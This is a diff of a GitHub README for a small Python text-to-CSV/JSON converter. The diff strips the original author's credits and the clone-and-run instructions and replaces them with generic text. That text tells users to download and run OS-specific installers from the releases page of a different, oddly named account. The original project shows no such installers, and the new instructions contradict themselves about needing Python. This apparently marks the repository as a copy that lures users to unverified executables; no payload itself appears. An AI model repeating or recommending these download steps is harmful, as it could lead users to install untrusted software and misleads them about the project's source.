@@ -1,135 +1,82 @@
-# 🔄 CTk Text To CSV/JSON Converter
+# 🌟 CTk-Text-To-CSV-JSON - Convert Text Effortlessly to CSV or JSON
 
-A modern **CustomTkinter** application to convert plain text into **CSV** or **JSON** format. This tool is perfect for data preprocessing, exporting structured data and automating text-to-data workflows with an intuitive GUI.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/releases)
 
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to CTk-Text-To-CSV-JSON! This is a user-friendly tool designed to convert your plain text files into CSV or JSON formats. With its clean, modern interface built on CustomTkinter, this application makes data conversion simple and fast. 
 
-- 📝 Convert plain text input to **[CSV](https://en.wikipedia.org/wiki/Comma-separated_values)** or **[JSON](https://www.w3schools.com/whatis/whatis_json.asp)**  
-- 🎨 Modern **CustomTkinter UI** with Light/Dark mode  
-- ⚡ Fast and responsive interface  
-- 💾 Save files directly from the app  
-- 🔧 Easy to customize input parsing and export format  
-- 🖥 Cross-platform: **Windows, Linux, macOS**  
-- 💡 Beginner-friendly, minimal dependencies  
+## 📥 Download & Install
 
+To get started, you need to download and install the application. Follow these steps:
 
-## 📌 Technologies Used
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/releases).
+  
+2. **Choose Your Version**: Look for the latest release version listed. Click on it to expand the details.
 
-### **Tkinter**
-Tkinter is Python’s standard GUI library used for building cross-platform desktop applications.
+3. **Download the Installer**: You will see a list of downloadable files. Choose the installer that matches your operating system (Windows, macOS, or Linux).
 
-### **CustomTkinter**
-[CustomTkinter](https://github.com/TomSchimansky/CustomTkinter) extends Tkinter with:
+4. **Run the Installer**: Locate the downloaded file and double-click to run the installer. Follow the on-screen instructions to complete the installation.
 
-- Modern, consistent design  
-- Light & Dark themes  
-- High-DPI scaling  
-- Fully customizable modern widgets  
+5. **Launch the Application**: Once installed, find CTk-Text-To-CSV-JSON in your applications menu. Click to open it and start converting your text files.
 
-Together, they ensure a smooth UI experience on **Windows**, **macOS** and **Linux**.
+## 📂 Features
 
-| Component | Description |
-|------------|--------------|
-| **Language** | Python 3.x |
-| **GUI Framework** | CustomTkinter |
-| **Core Libraries** | Tkinter, CustomTkinter |
+CTk-Text-To-CSV-JSON comes with several features to enhance your workflow:
 
+- **Easy Interface**: The application is designed for users of all skill levels. You do not need any programming knowledge to use it.
+  
+- **Cross-Platform**: Compatible with Windows, macOS, and Linux, ensuring you can use it no matter which operating system you prefer.
 
-## 🧰 Installation Steps
+- **Instant Conversion**: Quickly convert your plain text into CSV or JSON formats with just a few clicks.
 
-### Step 1. Clone the repository
+- **Save Your Work**: After conversion, easily save your files in the desired format to your local drive.
 
-```bash
-git clone https://github.com/iamx-ariful-islam/CTk-Text-To-CSV-JSON.git
-cd CTk-Text-To-CSV-JSON
-```
+- **Modern Design**: Enjoy a clean UI that is both attractive and functional.
 
-### Step 2. Install Python Dependencies
+## 🔧 System Requirements
 
-The `requirements.txt` file, lists of all the Python libraries that "**_ctk text to csv json_**" depends on and installs those packages from the file:
+Before using CTk-Text-To-CSV-JSON, ensure your system meets the following requirements:
 
-```bash
-pip install -r requirements.txt
-# or (Linux/MacOS)
-sudo pip install -r requirements.txt
-```
+- **Operating System**: Windows 7 or later, macOS 10.12 or later, Linux kernel 4.9 or later.
+  
+- **Memory**: At least 2 GB of RAM.
+  
+- **Storage**: Minimum of 50 MB of free disk space for the installation.
 
-### Step 3. Run the Application
-```bash
-python main.py
-```
+- **Python**: This application requires Python 3.7 or higher. If you do not have Python installed, the installer will guide you.
 
+## ⚙️ Using the Application
 
-## 📂 Folder Structure
-Here’s the structure of the **CTk Text To CSV JSON** project:
+1. **Open the Application**: Start CTk-Text-To-CSV-JSON from your applications menu.
+   
+2. **Load Your Text File**: Click on “Load File” to choose the plain text file you wish to convert.
+  
+3. **Select Output Format**: Choose either CSV or JSON as your output format.
+  
+4. **Convert Your File**: Click the “Convert” button to start the conversion process. The converted file will be saved in your chosen format.
 
-```bash
-CTk-Text-To-CSV-JSON/
-│
-├── screenshots/
-├── main.py
-│── LICENSE
-├── notes.txt
-├── README.md
-└── requirments.txt
-```
+5. **Access Your Files**: Navigate to the specified output directory to find your converted file.
 
+## ❓ Troubleshooting
 
-## 🖼️ Screenshots
+If you encounter issues while using CTk-Text-To-CSV-JSON, here are some common solutions:
 
-Here are some screenshots of the `CTk Text To CSV JSON` project:
+- **File Not Found**: Ensure the text file you are trying to load is in a supported format and that the path is correct.
 
-**Main Window - Dark Mode**<br/>
-![Main Windows](screenshots/main_1.png)<br/>
-**Output Main Window - Light Mode**<br/>
-![Output Main Window](screenshots/main_2.png)
+- **Conversion Errors**: Double-check that your text file does not contain any corrupt or invalid data.
 
+- **App Crashes**: If the application crashes, try restarting your computer and launching the app again.
 
-## 📄 Notes File (How it works)
-View full notes here: 👉 [notes.txt](notes.txt)
+## 🌐 Community & Support
 
-1. Show file(s) full path with comma separated
-1. Open text file dialog box by clicking "Browse File(s)"
-1. Open csv file dialog box by clicking "Set CSV File"
-1. Browse single file at a time
-1. Browse multiple files at a time
-1. Generate indivisual output file or not
-1. Enter output file name (Optional)
-1. Show the output result data
-1. Change/Select the theme mode (Default: Dark)
-1. Select the output file type for generate file(s) [TEXT File, JSON File, CSV File]
+For questions, feedback, or support, please visit our [GitHub Issues Page](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/issues). 
 
+You can also contribute to the project by submitting issues or requesting features that could improve CTk-Text-To-CSV-JSON.
 
-## 🤝 Contributing
+## 🔗 Useful Links
 
-Contributions, suggestions, and feedback are always welcome! ❤️<br/>
-To contribute:
+- [Releases Page](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/releases)
+- [Issues Page](https://github.com/LIDETA-CATHLOIC-CATHEDRAL-SCHOOL/CTk-Text-To-CSV-JSON/issues)
 
-1. Fork the repository
-2. Create a new branch (`feature/new-feature`)
-3. Commit your changes
-4. Push and submit a Pull Request
-
-💬 You can also open an issue if you’d like to discuss a feature or report a bug.
-
-
-## 🌐 For more or connect with me
-
-<p align='center'>
-  <a href="https://github.com/iamx-ariful-islam"><img src="https://img.shields.io/badge/GitHub-iamx--ariful--islam-black?style=for-the-badge&logo=github" /></a>&nbsp;&nbsp;
-  <a href="https://bd.linkedin.com/in/iamx-ariful-islam"><img src="https://img.shields.io/badge/LinkedIn-Md.%20Ariful%20Islam-blue?style=for-the-badge&logo=linkedin" /></a>&nbsp;&nbsp;
-  <a href="https://x.com/mx_ariful_islam"><img src="https://img.shields.io/badge/X-Md.%20Ariful%20Islam-black?style=for-the-badge&logo=x&logoColor=white" /></a>&nbsp;&nbsp;
-  <a href="https://www.facebook.com/iamx.ariful.islam/"><img src="https://img.shields.io/badge/Facebook-MD.%20Ariful%20Islam-%231877F2.svg?style=for-the-badge&logo=facebook&logoColor=white" /></a>
-</p>
-
-
-## 📜 License
-
-The [MIT](https://choosealicense.com/licenses/mit/) License (MIT)
-
-
-## 💖 Thank You for Visiting!
-
-> “Good design is about making things simple yet significant”  
-> — *Md. Ariful Islam*
+Thank you for using CTk-Text-To-CSV-JSON! We hope you find it a valuable tool for your data conversion needs.
